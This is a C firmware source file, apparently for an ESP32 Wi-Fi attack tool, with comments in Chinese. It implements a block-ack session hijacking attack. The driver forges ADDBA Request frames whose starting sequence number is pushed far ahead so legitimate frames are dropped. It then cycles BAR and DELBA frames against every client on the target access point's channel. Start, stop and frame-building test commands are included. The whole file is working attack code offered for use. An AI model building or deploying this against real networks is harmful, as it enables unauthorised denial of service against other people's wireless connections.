// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 XDUPWW

// 聚合会话劫持：ADDBA 把对端的接收窗口种到远处，再用 BAR / DELBA 搅乱它。

#include <string.h>

#include "attacks/attack.h"
#include "attacks/attack_common.h"
#include "hal_wifi/hal_wifi.h"
#include "wbus/wbus.h"
#include "wifi_frame/frame_build.h"
#include "wifi_frame/frames.h"
#include "wtarget/wtarget.h"

#define OWNER "ba"
#define CATEGORY_BA 3
#define ACTION_ADDBA_REQ 0
#define ACTION_DELBA 2

static bool s_active;
static uint8_t s_bssid[6];
static uint8_t s_channel;
static uint8_t s_tid;
static uint16_t s_step;
static uint32_t s_cursor;
static uint32_t s_frames;
static uint32_t s_addba;
static uint32_t s_bar;
static uint32_t s_delba;

// ADDBA Request：category/action + dialog token + 参数集 + 超时 + 起始序列号。
// SSN 是整个攻击的落点：对端拿它初始化 WinStartB，种到远处去真实帧就进不了窗口。
static int build_addba_req(uint8_t *buf, size_t cap, const uint8_t da[6], const uint8_t sa[6],
                           uint8_t dialog) {
    // 参数集：tid 在 bit2..5，buffer size 在 bit6..15，bit1 = A-MSDU supported
    const uint16_t params = (uint16_t)(((s_tid & 0x0F) << 2) | 0x0002);
    const uint16_t ssc = (uint16_t)((s_step & 0x0FFF) << 4);
    const uint8_t body[8] = {
        ACTION_ADDBA_REQ,
        dialog,
        (uint8_t)(params & 0xFF),
        (uint8_t)(params >> 8),
        0x00,  // 超时
        0x00,
        (uint8_t)(ssc & 0xFF),
        (uint8_t)(ssc >> 8),
    };
    return wf_build_action(buf, cap, da, sa, s_bssid, CATEGORY_BA, body, sizeof(body));
}

static int build_delba(uint8_t *buf, size_t cap, const uint8_t da[6], const uint8_t sa[6]) {
    const uint16_t params = (uint16_t)(((s_tid & 0x0F) << 12) | 0x0800);
    const uint8_t body[5] = {
        ACTION_DELBA,
        (uint8_t)(params & 0xFF),
        (uint8_t)(params >> 8),
        0x00,  // reason: 会话超时
        0x00,
    };
    return wf_build_action(buf, cap, da, sa, s_bssid, CATEGORY_BA, body, sizeof(body));
}

static void ba_tick(uint32_t now_ms) {
    (void)now_ms;
    if (!s_active) {
        return;
    }
    static uint8_t stas[HAL_WIFI_STA_MAX][6];
    static uint8_t frame[64];

    const size_t n = attack_sta_on_channel(s_channel, stas, HAL_WIFI_STA_MAX);
    if (n == 0) {
        return;  // 没有客户端就没有会话可劫，等下一轮
    }
    const uint8_t *sta = stas[s_cursor % n];
    const uint8_t phase = (uint8_t)((s_cursor / n) % 3);
    s_cursor++;

    int len;
    switch (phase) {
        case 0:
            len = build_addba_req(frame, sizeof(frame), sta, s_bssid, (uint8_t)(s_cursor & 0xFF));
            if (len > 0 && hal_wifi_tx(frame, (uint16_t)len) == ESP_OK) {
                s_frames++;
                s_addba++;
            }
            break;
        case 1:
            len = wf_build_bar(frame, sizeof(frame), sta, s_bssid, s_tid, s_step);
            if (len > 0 && hal_wifi_tx(frame, (uint16_t)len) == ESP_OK) {
                s_frames++;
                s_bar++;
            }
            break;
        default:
            len = build_delba(frame, sizeof(frame), sta, s_bssid);
            if (len > 0 && hal_wifi_tx(frame, (uint16_t)len) == ESP_OK) {
                s_frames++;
                s_delba++;
            }
            break;
    }
}

static const wb_policy_t kStartPolicy[] = {
    {.name = "idx", .type = WB_T_IDX, .required = true, .min = 1, .max = WT_MAX_ENTRIES},
    {.name = "step", .type = WB_T_U32, .required = false, .min = 0, .max = 4095, .def = 2047},
    {.name = "tid", .type = WB_T_U32, .required = false, .min = 0, .max = 15, .def = 0},
};

static esp_err_t ba_start(wb_args_t *args, wb_reply_t *reply) {
    wt_entry_t ap;
    if (!attack_target_ap(wb_args_u32(args, "idx"), &ap)) {
        wb_reply_fail(reply, "idx 不是 AP，先跑 scan.start");
        return ESP_ERR_INVALID_ARG;
    }
    attack_exclusive();
    memcpy(s_bssid, ap.bssid, 6);
    s_channel = ap.channel;
    s_tid = (uint8_t)wb_args_u32(args, "tid");
    s_step = (uint16_t)wb_args_u32(args, "step");
    s_cursor = 0;
    s_frames = 0;
    s_addba = 0;
    s_bar = 0;
    s_delba = 0;

    hal_wifi_sniffer_enable(true);
    const esp_err_t err = attack_pin(OWNER, s_channel);
    if (err != ESP_OK) {
        wb_reply_fail(reply, "占不到信道 %u（%s）", (unsigned)s_channel, esp_err_to_name(err));
        return err;
    }
    s_active = true;
    attack_emit("ba", true, "ch=%u tid=%u", (unsigned)s_channel, (unsigned)s_tid);
    wb_reply_line(reply, "ba 开跑 ch=%u tid=%u ssn=%u", (unsigned)s_channel, (unsigned)s_tid,
                  (unsigned)s_step);
    return ESP_OK;
}

static void ba_stop(void) {
    if (!s_active) {
        return;
    }
    s_active = false;
    attack_unpin(OWNER);
    attack_emit("ba", false, NULL);
}

static esp_err_t ba_stop_cmd(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    const uint32_t frames = s_frames;
    ba_stop();
    attack_report_rate(reply, "ba", frames);
    wb_reply_line(reply, "addba=%u bar=%u delba=%u", (unsigned)s_addba, (unsigned)s_bar, (unsigned)s_delba);
    return ESP_OK;
}

static esp_err_t ba_test(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    static const uint8_t kSta[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    uint8_t frame[64];
    int len = build_addba_req(frame, sizeof(frame), kSta, s_bssid, 1);
    if (len <= 0) {
        wb_reply_fail(reply, "组帧失败");
        return ESP_FAIL;
    }
    wb_reply_line(reply, "addba len=%d cat=%u act=%u tid=%u ssn=%u", len, frame[24], frame[25],
                  (unsigned)((frame[27] >> 2) & 0x0F),
                  (unsigned)(((frame[31] | (frame[32] << 8)) >> 4) & 0x0FFF));
    len = wf_build_bar(frame, sizeof(frame), kSta, s_bssid, s_tid, s_step);
    if (len <= 0) {
        wb_reply_fail(reply, "BAR 组帧失败");
        return ESP_FAIL;
    }
    wb_reply_line(reply, "bar len=%d fc=0x%02X tid=%u ssn=%u", len, frame[0],
                  (unsigned)((frame[16] >> 4) & 0x0F),
                  (unsigned)(((frame[18] | (frame[19] << 8)) >> 4) & 0x0FFF));
    return ESP_OK;
}

static const wb_method_t kMethods[] = {
    {"start", ba_start, "idx=1..64 [step=0..4095] [tid=0..15]", kStartPolicy, 3},
    {"stop", ba_stop_cmd, "", NULL, 0},
    {"test", ba_test, "", NULL, 0},
};

static const wb_object_t kObject = {
    .name = "ba",
    .methods = kMethods,
    .n_methods = sizeof(kMethods) / sizeof(kMethods[0]),
};

static uint32_t ba_frames(void) {
    return s_frames;
}

static bool ba_active(void) {
    return s_active;
}

static const attack_driver_t kDriver = {
    .name = "ba",
    .object = &kObject,
    .stop = ba_stop,
    .tick = ba_tick,
    .frames = ba_frames,
    .active = ba_active,
};

const attack_driver_t *ba_attack(void) {
    return &kDriver;
}
